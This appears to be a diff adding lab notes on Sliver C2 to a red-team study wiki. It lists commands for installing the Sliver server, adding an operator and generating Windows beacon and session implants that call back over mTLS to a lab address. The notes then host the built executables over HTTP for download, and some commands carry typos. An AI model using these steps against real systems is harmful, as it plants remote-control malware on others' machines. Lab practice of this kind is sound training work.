@@ -87,3 +87,38 @@
   * getsystem
   * Beacon Object Files (BOFs)
   * other third-party tooling
+
+## Lab Notes: Sliver C2
+
+### Kali (Sliver) Configuration
+
+* snapshot
+* set network adapter to LAN
+* configure network settings
+
+<figure><img src=".gitbook/assets/{2BE63BE6-0A5D-4006-A511-CFC5E19F17F3}.png" alt=""><figcaption></figcaption></figure>
+
+```
+sudo adduser shapiro
+sudo usermod -aG sudo shapiro
+sudo hostnamectl set-hostname kali01-shapiro
+sudo apt install sliver
+sliver-server
+[server] sliver > multiplayer
+[server] sliver >  jobs
+[server] sliver > new-operator -n shapiro -l 10.0.5.20
+sliver-client import /home/shapiro/shapiro_10.0.5.20.cfg
+sliver-client
+sliver > sessions
+sliver > profiles new --mtls 10.0.5.20 --format ex --os windows --arch amd64 windows-session
+sliver > profiles new beacom --mtls 10.0.5.20  --format exe --seconds 5 --jitter 3 --os windows --arch amd64 windows-beacon
+sliver > profiles generate --save ~/Public/beacon1.exe windows-beacon
+cd ~/Public
+file imp1.exe beacon1.exe
+sudo python3 -m http.server 80
+sudo mkdir /var/www/html/files
+sudo cp ~/Public/*.exe /var/www/html/files/
+ls -lha /var/www/html/files/
+sliver > sessions
+[server] sliver > mtls
+```
